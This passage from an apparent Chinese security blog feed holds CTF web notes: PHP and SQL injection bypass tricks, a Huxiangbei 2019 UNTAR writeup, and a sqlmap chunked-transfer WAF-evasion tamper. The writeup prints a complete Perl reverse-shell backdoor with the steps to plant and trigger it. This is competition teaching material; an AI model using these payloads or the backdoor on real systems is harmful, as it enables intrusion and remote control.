passwd=’.$passwd[0].’ &#39; ‘ ;</p><p>要产生注入，则必须构造payload来截断单引号，打乱sql语句原来的构成标准。即可构造user=&amp;&amp;passwd=or 1#<br>此时sql语句为<br>select * from flag where user=’ &#39; and passwd= ‘ or 1# ‘; </p><p>url二次编码绕过单引号过滤</p><p>sql注入空格还可以用\t,/**/等来代替</p><p>vim自动保存为.swp后缀、UltrlEditor自动保存.bak后缀</p><p>在文件后面添加.bak、.swp、.old、~等探测。</p><p>记得手动试一下备份文件<a href="http://www.zip,很常见">www.zip,很常见</a></p><p>CVS会在所有目录添加特殊文件，如果这些文件同步到Web目录后就会泄漏路径等信息。</p><p>检测方法：http://[ip]/CVS/Entriesp</p><p>php5.2以上allow_url_include关闭，若开启allow_url_include则容易引起php://input伪协议进行包含</p><p>通过php glob()函数读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-keyword">foreach</span> (glob(<span class="hljs-string">&quot;*.txt&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span>) &#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$filename</span> size &quot;</span> . filesize(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br> &#125;<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>命令执行时当；|| &amp;&amp; 被过滤时可以尝试%0a来绕过多执行一条命令。</p><p> 18.当addslashes（）函数遇到json_encode()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-variable">$sa</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>   <span class="hljs-variable">$sa</span>=addslashes(<span class="hljs-variable">$sa</span>);<br>   <span class="hljs-keyword">echo</span> json_encode(<span class="hljs-variable">$sa</span>);<br></code></pre></td></tr></table></figure><p>如果提交a=admin‘ 则json后能够逃逸反斜杠 \</p><p>此时\被再次转义，即 ‘ 可逃逸。</p><p>19.win下php可以利用短文件名来实现文件爆破，比如就是当文件名超过 <code>6</code> 位时，可以用 <code>~1</code> 表示后面的字符串，比如我们的文件名叫 <code>abcdefghijk.txt</code>，短文件名表示成:<code>abcdef~1.txt</code>，如果这时候还有个叫 <code>abcdefhhhh.txt</code> 的，就可以把 <code>1</code> 改成 <code>2</code>：<code>abcdef~2.txt</code></p><p><strong>doc</strong>和<strong>zip</strong>的文件头一样，因此构造一句话木马打包后，<strong>Burpsuite</strong>抓包修改后缀名和<strong>Mime</strong>类型上传，最后使用zip伪协议读取即可。</p><p>door为数组则$secret将为null</p><p>生成多个md5值相同的文件</p><p><a href="https://www.yuque.com/sourcecode/2019hgame/magical_md5">https://www.yuque.com/sourcecode/2019hgame/magical_md5</a></p><p>php://filter 伪协议支持多个过滤器同时使用</p><p>.htaccess开启php解析引擎</p><p>AddType application/x-httpd-php .png</p><p>php_flag engine 1</p><p>php://resource=jpg/resource=file/tips.txt 可以绕过以下正则</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/^php:\/\/.*resource=([^|]*)/i</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>湖湘杯2019 web1-UNTAR writeup</title>
    <link href="/2019/11/09/hxbctf-2019.html"/>
    <url>/2019/11/09/hxbctf-2019.html</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-观察源码"><a href="#0x01-观察源码" class="headerlink" title="0x01 观察源码"></a>0x01 观察源码</h1><p><img src="/images/image-20191109220539708.png" alt="image-20191109220539708"></p><p>观察源码，</p><p>反正我看完心情就是这样:<img src="/images/image-20191109220630610.png" alt="image-20191109220630610"></p><h1 id="0x02-分析与操作"><a href="#0x02-分析与操作" class="headerlink" title="0x02 分析与操作"></a>0x02 分析与操作</h1><p>切回正题，发现php针对每个ip进行md5加密之后把httpGET到的文件存入sandbox/md5(ip)中，如果可以untar就进行untar操作。</p><p>注意函数<code>escapeshellarg()</code> 基本上已经告别了|，&amp;&amp;，;之类的rce了。</p><p>将目光放入untar操作，要知道，tar是可以压缩软连接文件的，</p><p>也就是说我们在linux中我们进行<code>ln -s / jesen</code> 操作，我<code>cd jesen</code>就相当于<code>cd /</code></p><p>将jesen压缩：<code>tar zvf jesen.tar jesen</code> (本命令纯属回忆没测试)</p><p>压缩之后payload:<code>GET /index.php?url=http://someip:port/jesen.tar&amp;filename=jesen.txt</code></p><p>发现sandbox对应文件夹下多出j文件夹，访问j文件夹，点击flag，发现提示403 Forbidden，应该是出题人限制了权限，唉。</p><p>这里提一下，之前其实进行了很多次尝试，并且搞崩了web服务器两次+ ，主办方并没有用docker，所以好多人都被我卡了哈哈。</p><p>php在sandbox目录无法解析，但是在尝试过程中，曾经把<code>/var/www/html</code>给软连接了，看了一下其他人的进度，发现有一队成功执行了php 不知道什么情况。</p><h2 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h2><p>经历一番波折，参考： <a href="http://momomoxiaoxi.com/2017/11/08/HITCON/">http://momomoxiaoxi.com/2017/11/08/HITCON/</a>  moxiaoxi师傅博客好多好东西哈哈</p><p>题目的考点就是CVE-2016-1238.在URI/lib/URi.pm 136行，有一个<code>eval &quot;require $ic&quot;;</code>语句，当解析遇到一个未定义的协议时，会require这个未知协议。而require的时候，perl脚本会自动搜索当下目录和perl库目录来导入以.pm结尾的模块。</p><p>漏洞代码如下：</p><figure class="highlight perl"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><pre><code class="hljs perl">$ic = <span class="hljs-string">&quot;URI::$scheme&quot;</span>;  <span class="hljs-comment"># default location</span><br><span class="hljs-comment"># turn scheme into a valid perl identifier by a simple transformation...</span><br>$ic =~ <span class="hljs-regexp">s/\+/_P/g</span>;<br>$ic =~ <span class="hljs-regexp">s/\./_O/g</span>;<br>$ic =~ <span class="hljs-regexp">s/\-/_/g</span>;<br><span class="hljs-keyword">no</span> strict <span class="hljs-string">&#x27;refs&#x27;</span>;<br><span class="hljs-comment"># check we actually have one for the scheme:</span><br><span class="hljs-keyword">unless</span> (@&#123;<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;ic&#125;</span>::ISA&quot;</span>&#125;) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> <span class="hljs-keyword">exists</span> $require_attempted&#123;$ic&#125;) &#123;<br>        <span class="hljs-comment"># Try to load it</span><br>        <span class="hljs-keyword">my</span> $_old_error = $@;<br>        <span class="hljs-keyword">eval</span> <span class="hljs-string">&quot;require $ic&quot;</span>;<br>        <span class="hljs-keyword">die</span> $@ <span class="hljs-keyword">if</span> $@ &amp;&amp; $@ !~ <span class="hljs-regexp">/Can\&#x27;t locate.*in \@INC/</span>;<br>        $@ = $_old_error;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">undef</span> <span class="hljs-keyword">unless</span> @&#123;<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;ic&#125;</span>::ISA&quot;</span>&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以，我们先找一个perl的后门：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/perl -w</span><br><span class="hljs-comment"># perl-reverse-shell - A Reverse Shell implementation in PERL</span><br><span class="hljs-keyword">use</span> strict;<br><span class="hljs-keyword">use</span> Socket;<br><span class="hljs-keyword">use</span> FileHandle;<br><span class="hljs-keyword">use</span> POSIX;<br><span class="hljs-keyword">my</span> $VERSION = <span class="hljs-string">&quot;1.0&quot;</span>;<br><br><span class="hljs-comment"># Where to send the reverse shell. Change these.</span><br><span class="hljs-keyword">my</span> $ip = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-keyword">my</span> $port = <span class="hljs-number">1234</span>;<br><br><span class="hljs-comment"># Options</span><br><span class="hljs-keyword">my</span> $daemon = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">my</span> $auth   = <span class="hljs-number">0</span>; <span class="hljs-comment"># 0 means authentication is disabled and any </span><br>        <span class="hljs-comment"># source IP can access the reverse shell</span><br><span class="hljs-keyword">my</span> $authorised_client_pattern = <span class="hljs-regexp">qr(^127\.0\.0\.1$)</span>;<br><br><span class="hljs-comment"># Declarations</span><br><span class="hljs-keyword">my</span> $global_page = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">my</span> $fake_process_name = <span class="hljs-string">&quot;/usr/sbin/apache&quot;</span>;<br><br><span class="hljs-comment"># Change the process name to be less conspicious</span><br>$0 = <span class="hljs-string">&quot;[httpd]&quot;</span>;<br><br><span class="hljs-comment"># Authenticate based on source IP address if required</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">defined</span>($ENV&#123;<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>&#125;)) &#123;<br>    cgiprint(<span class="hljs-string">&quot;Browser IP address appears to be: $ENV&#123;&#x27;REMOTE_ADDR&#x27;&#125;&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> ($auth) &#123;<br>        <span class="hljs-keyword">unless</span> ($ENV&#123;<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>&#125; =~ $authorised_client_pattern) &#123;<br>            cgiprint(<span class="hljs-string">&quot;ERROR: Your client isn&#x27;t authorised to view this page&quot;</span>);<br>            cgiexit();<br>        &#125;<br>    &#125;<br>&#125; <span class="hljs-keyword">elsif</span> ($auth) &#123;<br>    cgiprint(<span class="hljs-string">&quot;ERROR: Authentication is enabled, but I couldn&#x27;t determine your IP address. Denying access&quot;</span>);<br>    cgiexit(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment"># Background and dissociate from parent process if required</span><br><span class="hljs-keyword">if</span> ($daemon) &#123;<br>    <span class="hljs-keyword">my</span> $pid = <span class="hljs-keyword">fork</span>();<br>    <span class="hljs-keyword">if</span> ($pid) &#123;<br>        cgiexit(<span class="hljs-number">0</span>); <span class="hljs-comment"># parent exits</span><br>    &#125;<br><br>    setsid();<br>    <span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br>    <span class="hljs-keyword">umask</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment"># Make TCP connection for reverse shell</span><br><span class="hljs-keyword">socket</span>(SOCK, PF_INET, SOCK_STREAM, <span class="hljs-keyword">getprotobyname</span>(<span class="hljs-string">&#x27;tcp&#x27;</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">connect</span>(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;<br>    cgiprint(<span class="hljs-string">&quot;Sent reverse shell to $ip:$port&quot;</span>);<br>    cgiprintpage();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    cgiprint(<span class="hljs-string">&quot;Couldn&#x27;t open reverse shell to $ip:$port: $!&quot;</span>);<br>    cgiexit();    <br>&#125;<br><br><span class="hljs-comment"># Redirect STDIN, STDOUT and STDERR to the TCP connection</span><br><span class="hljs-keyword">open</span>(STDIN, <span class="hljs-string">&quot;&gt;&amp;SOCK&quot;</span>);<br><span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;SOCK&quot;</span>);<br><span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;SOCK&quot;</span>);<br>$ENV&#123;<span class="hljs-string">&#x27;HISTFILE&#x27;</span>&#125; = <span class="hljs-string">&#x27;/dev/null&#x27;</span>;<br><span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;w;uname -a;id;pwd&quot;</span>);<br><span class="hljs-keyword">exec</span>(&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>&#125; ($fake_process_name, <span class="hljs-string">&quot;-i&quot;</span>));<br><br><span class="hljs-comment"># Wrapper around print</span><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">cgiprint</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $line = <span class="hljs-keyword">shift</span>;<br>    $line .= <span class="hljs-string">&quot;&lt;p&gt;\n&quot;</span>;<br>    $global_page .= $line;<br>&#125;<br><br><span class="hljs-comment"># Wrapper around exit</span><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">cgiexit</span> </span>&#123;<br>    cgiprintpage();<br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">0</span>; <span class="hljs-comment"># 0 to ensure we don&#x27;t give a 500 response.</span><br>&#125;<br><br><span class="hljs-comment"># Form HTTP response using all the messages gathered by cgiprint so far</span><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">cgiprintpage</span> </span>&#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Content-Length: &quot;</span> . <span class="hljs-keyword">length</span>($global_page) . <span class="hljs-string">&quot;\r Connection: close\r Content-Type: text\/html\r\n\r\n&quot;</span> . $global_page;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后，将其部署到服务器上（反弹ip改为我们服务器的ip）。</p><p>payload:<code>GET index.php?filename=URI/jesen.pm&amp;url=http://xx.xx.xx.x/jesen.pm</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Html">http://xx/index.php?filename=URI/jesen.pm&amp;url=http://xx.xx.xx.x/jesen.pm<br>└── sandbox<br>    └── xxxxxxxxxxxxxxxxxxxxxxxxxx<br>        └── URI<br>            └── jesen.pm<br></code></pre></td></tr></table></figure><p>这样就在网站上新建了一个URI目录，目录下有jesen.pm文件，文件内容为我们的backdoor。</p><p>在服务器上监听端口，再访问<code>http://xx/index.php?filename=xxx&amp;url=jesen://jesen666</code>就能获得一个反弹shell。这里访问<code>jesen://jesen666</code>时，<code>jesen</code>是未定义模块，所以会自动搜索并加载URI中的<code>jesen.pm</code> 模块。</p><p>这里回到.php源码我们发现，源码对url进行了限制，只能以<code>http/https</code>开头，所以我们使用短链接，</p><p>将<code>jesen://jesen666</code>转为短链接即可，</p><p>所以最后payload为:<code>index.php?filename=随意&amp;url=短链接地址</code></p><p>然后成功反弹shell，执行./readflag 即可获得flag <code>flag&#123;c3aa64ff011a32eca10c95de2200e12f&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>分块传输tamper</title>
    <link href="/2019/11/07/chunk_tamper.html"/>
    <url>/2019/11/07/chunk_tamper.html</url>
    
    <content type="html"><![CDATA[<h1 id="分块传输tamper"><a href="#分块传输tamper" class="headerlink" title="分块传输tamper"></a>分块传输tamper</h1><p>本文转载自： <a href="http://www.nmd5.com/?p=303">http://www.nmd5.com/?p=303</a>  大佬侵权删哦！~</p><p>最近看到大佬们都在搞分块传输，据说能吊打所有waf，所以我也跟随大佬们的脚步。</p><p>首先先了解下什么是分块传输。</p><p><img src="/images/20190308094925_59360.png" alt="blob"></p><hr><p><code>分块传输编码（Chunked transfer encoding）是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由应用服务器发送给客户端应用（ 通常是网页浏览器）的数据可以分成多个部分。分块传输编码只在HTTP协议1.1版本（HTTP/1.1）中提供。通常，HTTP应答消息中发送的数据是整个发送的，Content-Length消息头字段表示数据的长度。数据的长度很重要，因为客户端需要知道哪里是应答消息的结束，以及后续应答消息的开始。然而，使用分块传输编码，数据分解成一系列数据块，并以一个或多个块发送，这样服务器可以发送数据而不需要预先知道发送内容的总大小。通常数据块的大小是一致的，但也不总是这种情况。</code></p><hr><p>一般情况HTTP的Header包含Content-Length域来指明报文体的长度。有时候服务生成HTTP回应是无法确定消息大小的，比如大文件的下载，或者后台需要复杂的逻辑才能全部处理页面的请求，这时用需要实时生成消息长度，服务器一般使用chunked编码。</p><p>在进行Chunked编码传输时，在回复消息的Headers有transfer-coding域值为chunked，表示将用chunked编码传输内容。</p><p>理论知识就说到这。下面说说在写tamper过程中的坑，目前还有些问题没有解决。</p><hr><p>但是接下来的时间要忙些别的，所以把这段时间的结果先写到博客里面，以后有时间在继续把这些坑填上.</p><p>下面切换回正题，正常的post数据包如下</p><p><img src="/images/20190308101349_35348.png" alt="blob"></p><p>而分块传输的post数据包如下</p><p><img src="/images/20190308101355_13243.png" alt="blob"></p><p>服务器能正常接收到数据并返回了正常的页面内容</p><p>分块传输的post数据头部需要添加</p><figure class="highlight fortran"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-built_in">Transfer</span>-Encoding:Chunked<br></code></pre></td></tr></table></figure><p>而post的数据是这种格式<br>&gt;2<br>id<br>2<br>=3<br>0</p><p>分块传输格式解析</p><p>2   #这个2表示下面数据的个数 可以在这个后面加入分号后面添加注释 比如 2;hello world 可以利用这个特性添加随机字符来干扰waf</p><p>id   #数据内容 内容就是id一共就两个 所以上面的个数是2</p><p>2   #同理 表示下面的数据的个数</p><p>=3  #这个也是同理 和前面的id连起来 post的数据就是 id=3 </p><p>0   #分块传输表示结束的方式 一个0和两个换号<br>    #换行<br>    #换行</p><p>既然知道了发送的数据格式，那下一步就是写个sqlmap的tamper<br>首先先把post数据的head的内容加上。</p><p><img src="/images/20190308103343_76255.png" alt="blob"></p><p>加上后sqlmap数据始终发不出去。</p><p><img src="/images/20190308102910_75066.png" alt="blob"></p><p>似乎遇到这个问题不只我一个，一个老哥是sqlmap加参数解决的这个问题 sqlmap.py -r 1.txt –headers=”Transfer-Encoding: chunked”</p><p>但是我的解决方法是 在encoding后面加了个空格 同时能正常发送数据包</p><p><img src="/images/20190308104112_63576.png" alt="blob"></p><p>sqlmap能正常发送出数据包 且服务器也能正常的接收到数据</p><p><img src="/images/20190308105624_54439.png" alt="blob"></p><p>但是sqlmap在payload生成后 还url编码下才发送给服务器，所以导致\n换行符或其他特殊字符会被编码，最后服务器无法理解。</p><p>目前的解决方法是通过给sqlmap加参数 –skip-urlencode 跳过url编码</p><p><img src="/images/20190308110312_98069.png" alt="blob"></p><p>但是我不想通过加参数，想直接写到tamper里面，各种疯狂百度谷歌还有问大佬们</p><p><img src="/images/20190308110820_69063.png" alt="blob"></p><p>但是都没结果，于是我就去翻sqlmap的源码。</p><p>找到了urlencode的位置 也找到了最后给调用给payload编码的位置，但是还是不知道怎么写到tamper里面，如果改源码的话，那样就很容易，但是这样毫无意义。</p><p>还有个最重要的问题，那就是sqlmap的tamper无法获取payload的前面的参数，比如id=3 无法把payload的内容写到id=的前面</p><p>目前我的解决方法是手工把要注入的post包先把格式改下。</p><p><img src="/images/20190308112655_96042.png" alt="blob"></p><p>然后就用sqlmap跑起来<br><code>python sqlmap/sqlmap.py -r 1.txt --tamper=fkcs --skip-urlencode</code></p><p><img src="/images/20190308114103_74500.png" alt="blob"></p><p><img src="/images/20190308114113_28322.png" alt="blob"></p><p>能正常使用，但是最大的问题在于怎么修改payload前面的参数，这样手工提前修改数据真的是low的不行，所以算个残疾品，等以后有时间再继续完善它。</p><p>相关文章：<br>利用分块传输吊打所以wa<br><a href="https://www.freebuf.com/articles/web/194351.htmlf">https://www.freebuf.com/articles/web/194351.htmlf</a></p><p>HTTP协议bypass WAF(狗/盾)<br><a href="https://www.t00ls.net/thread-49138-1-1.html">https://www.t00ls.net/thread-49138-1-1.html</a></p><p>SQLMAP|阅读手记一{从sqlmap.py开始到参数分析}<br><a href="http://www.wupco.cn/?p=323">http://www.wupco.cn/?p=323</a></p><p>定制Sqlmap<br><a href="http://lietolive.com/sqlmap/%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/2018/01/24/%E5%AE%9A%E5%88%B6Sqlmap.html">http://lietolive.com/sqlmap/%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/2018/01/24/%E5%AE%9A%E5%88%B6Sqlmap.html</a></p><p>SQLMAP进阶使用<br><a href="http://www.vuln.cn/6495">http://www.vuln.cn/6495</a></p><p>sqlmap源码解析之test和boundary组合生成payload<br><a href="http://www.beesfun.com/2017/03/30/sqlmap%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90%E4%B9%8Btest%E5%92%8Cboundary%E7%BB%84%E5%90%88%E7%94%9F%E6%88%90payload/">http://www.beesfun.com/2017/03/30/sqlmap%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90%E4%B9%8Btest%E5%92%8Cboundary%E7%BB%84%E5%90%88%E7%94%9F%E6%88%90payload/</a></p><p>sqlmap 的源码学习笔记一之目录结构<br><a href="https://blog.csdn.net/qq_29277155/article/details/51646932">https://blog.csdn.net/qq_29277155/article/details/51646932</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF中的PHP常见姿势分析</title>
    <link href="/2019/11/05/ctf-php-zishi.html"/>
    <url>/2019/11/05/ctf-php-zishi.html</url>
    
    <content type="html"><![CDATA[<h1 id="CTF中的php常见姿势分析"><a href="#CTF中的php常见姿势分析" class="headerlink" title="CTF中的php常见姿势分析"></a>CTF中的php常见姿势分析</h1><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(eregi(<span class="hljs-string">&quot;hackerDJ&quot;</span>,<span class="hljs-variable">$_GET</span>[id])) &#123;  <span class="hljs-comment">//eregi字符串对比</span><br><br> <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);<br><br> <span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><h2 id="2-isset-判断变量是否定义过"><a href="#2-isset-判断变量是否定义过" class="headerlink" title="2.isset 判断变量是否定义过"></a>2.isset 判断变量是否定义过</h2><h2 id="3-比较符"><a href="#3-比较符" class="headerlink" title="3.比较符"></a>3.<strong>比较符</strong></h2><p>$a==$b  松散比较</p><p>===    完全等于</p><p>=     大于等于</p><p>!=    如果类型转换后$a不等于$b,Ture</p><p>!==    不完全等于，如果$a不等于$b或者它们类型不同，Ture</p><p>当php进行一些数学计算的时候，当有一个对比参数是整数的时候,会把另外一个参数强制转换为整数。</p><p>1 var_dump(0 == ‘0’); // true</p><p>2 var_dump(0 == ‘abcdefg’); // true</p><p>3 var_dump(0 === ‘abcdefg’); // false</p><p>4 var_dump(1 == ‘1abcdef’); // true</p><p>* bool类型的true跟任意字符串可以弱类型相等</p><p>在某些情况下，PHP会把类数值数据（如含有数字的字符串等）转换成数值处理，== 运算符就是其中之一。在使用 == 运算符对两个字符串进行松散比较时，PHP会把类数值的字符串转换为数值进行比较，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。比如: ‘3’ == ‘3ascasd’结果为true。</p><h2 id="4-eval可以直接执行php代码"><a href="#4-eval可以直接执行php代码" class="headerlink" title="4.eval可以直接执行php代码"></a>4.<strong>eval</strong>可以直接执行php代码</h2><h2 id="5-intval-将变量转成整数类型"><a href="#5-intval-将变量转成整数类型" class="headerlink" title="5.intval  将变量转成整数类型"></a>5.<strong>intval</strong>  将变量转成整数类型</h2><h2 id="6-ereg-函数"><a href="#6-ereg-函数" class="headerlink" title="6.ereg()函数"></a>6.<strong>ereg()</strong>函数</h2><h6 id="用指定的模式搜索一个字符串中指定的字符串-如果匹配成功返回true-否则-则返回false。搜索字母的字符是大小写敏感的。"><a href="#用指定的模式搜索一个字符串中指定的字符串-如果匹配成功返回true-否则-则返回false。搜索字母的字符是大小写敏感的。" class="headerlink" title="用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。"></a>用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">ereg</span><span class="hljs-params">(<span class="hljs-built_in">string</span> pattern, <span class="hljs-built_in">string</span> originalstring, [<span class="hljs-built_in">array</span> regs])</span></span>;<br></code></pre></td></tr></table></figure><p>例，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$email_id</span> = <span class="hljs-string">&quot;admin@tutorialspoint.com&quot;</span>;<br><br><span class="hljs-variable">$retval</span> = ereg(<span class="hljs-string">&quot;(\.)(com$)&quot;</span>, <span class="hljs-variable">$email_id</span>);<br></code></pre></td></tr></table></figure><p>ereg()限制password的格式，只能是数字或者字母。但ereg()函数存在NULL截断漏洞，可以使用%00绕过验证。</p><p>这里ereg有两个漏洞：</p><p>  ①%00截断及遇到%00则默认为字符串的结束</p><p>  ②当ntf为数组时它的返回值不是FALSE</p><h2 id="7-strpos-—-查找字符串首次出现的位置"><a href="#7-strpos-—-查找字符串首次出现的位置" class="headerlink" title="7.strpos — 查找字符串首次出现的位置"></a>7.<strong>strpos</strong> — 查找字符串首次出现的位置</h2><p>例，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$mystring</span> = <span class="hljs-string">&#x27;abc&#x27;</span>;<br><span class="hljs-variable">$findme</span>  = <span class="hljs-string">&#x27;a&#x27;</span>;<br><span class="hljs-variable">$pos</span> = strpos(<span class="hljs-variable">$mystring</span>, <span class="hljs-variable">$findme</span>);<br></code></pre></td></tr></table></figure><h2 id="8-GET可以接受数组但MD5不能处理数组结构的数据"><a href="#8-GET可以接受数组但MD5不能处理数组结构的数据" class="headerlink" title="8.$_GET可以接受数组但MD5不能处理数组结构的数据"></a>8.$_GET可以接受数组但MD5不能处理数组结构的数据</h2><p><strong>md5（）</strong>不能处理数组结构的数据</p><p>利用此漏洞构造<code>index.php?a[]=1&amp;b[]=2</code></p><p>构造<code>?a[]=1&amp;b[]=2</code>这样md5函数无法处理数组返回false完成匹配得到flag</p><p>例，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span 